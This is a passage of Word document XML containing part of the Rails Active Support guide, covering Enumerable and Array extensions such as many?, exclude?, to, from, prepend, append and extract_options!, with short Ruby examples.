              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>pagination_links %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10BCED55" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2BD71EC7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If an optional block is given, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>many?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> only takes into account those elements that return true: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96CCA78" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="76C47296" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="27608183"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@see_more</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= videos.many? {|video| video.category == params[:category]}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0DA03FAE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/enumerable.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B7A0C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>exclude?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9F8600" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The predicate </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>exclude?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tests whether a given object does </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> belong to the collection. It is the negation of the built-in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>include?</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4968"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1CEBC3E9" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14E47F13" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="333729729"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>to_visit &lt;&lt; node if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>visited.exclude?(node)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1BC78A7A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/enumerable.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51183313" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">10 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Array</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286C480E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>10.1 Accessing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D1506FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support augments the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of arrays to ease certain ways of accessing them. For example, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns the subarray of elements up to the one at the passed index:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="04AB944C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0ABA2A2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(a b c d).to(2) # =&gt; %w(a b c)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22F0A30B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[].to(7)          # =&gt; []</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4564DD09" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Similarly, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns the tail from the element at the passed index to the end. If the index is greater than the length of the array, it returns an empty array.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4560"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="05E6E542" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4980694D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(a b c d).from(2)  # =&gt; %w(c d)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E54904E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(a b c d).from(10) # =&gt; []</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D30D84D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[].from(0)           # =&gt; []</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="05F5BC05" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The methods </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>second</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>third</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>fourth</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>fifth</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> return the corresponding element (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is built-in). Thanks to social wisdom and positive constructiveness all around, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>forty_two</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is also available.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7CB4C434" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3F3AB148" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(a b c d).third # =&gt; c</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49AFEA1A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(a b c d).fifth # =&gt; nil</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3DD7FA26" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/array/access.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A45601" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>10.2 Adding Elements</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="388421CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">10.2.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>prepend</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4011B394" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This method is an alias of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Array#unshift</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="69B32A4D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02230325" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(a b c d).prepend('e')  # =&gt; %w(e a b c d)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="143C55C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[].prepend(10)            # =&gt; [10]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="196AC49C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/array/prepend_and_append.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30055915" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">10.2.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>append</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58374E3F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This method is an alias of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Array#&lt;&lt;</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5400"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7669A11C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5CC1BC00" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(a b c d).append('e')  # =&gt; %w(a b c d e)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F56222C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[].append([1,2])         # =&gt; [[1,2]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4D56B90A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/array/prepend_and_append.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130596DE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>10.3 Options Extraction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58797B25" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When the last argument in a method call is a hash, except perhaps for a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&amp;block</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> argument, Ruby allows you to omit the brackets:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4488"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="17B5A2AD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="477612A2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="176161651"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User.exists?(:email</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; params[:email])</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2E2E87D0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>That syntactic sugar is used a lot in Rails to avoid positional arguments where there would be too many, offering instead interfaces that emulate named parameters. In particular it is very idiomatic to use a trailing hash for options.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1CFC8C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If a method expects a variable number of arguments and uses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in its declaration, however, such an options hash ends up being an item of the array of arguments, where it loses its role.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5511535C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In those cases, you may give an options hash a distinguished treatment with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>extract_options!</w:t>
      </w:r>
      <w:r>
        <w:t>. This method checks the type of the last item of an array. If it is a hash it pops it and returns it, otherwise it returns an empty hash.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B7DBB9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Let’s see for example the definition of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>caches_action</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> controller macro:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4560"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0B66BD30" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C74FFE0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>caches_action(*actions)</w:t>
            </w:r>
          </w:p>
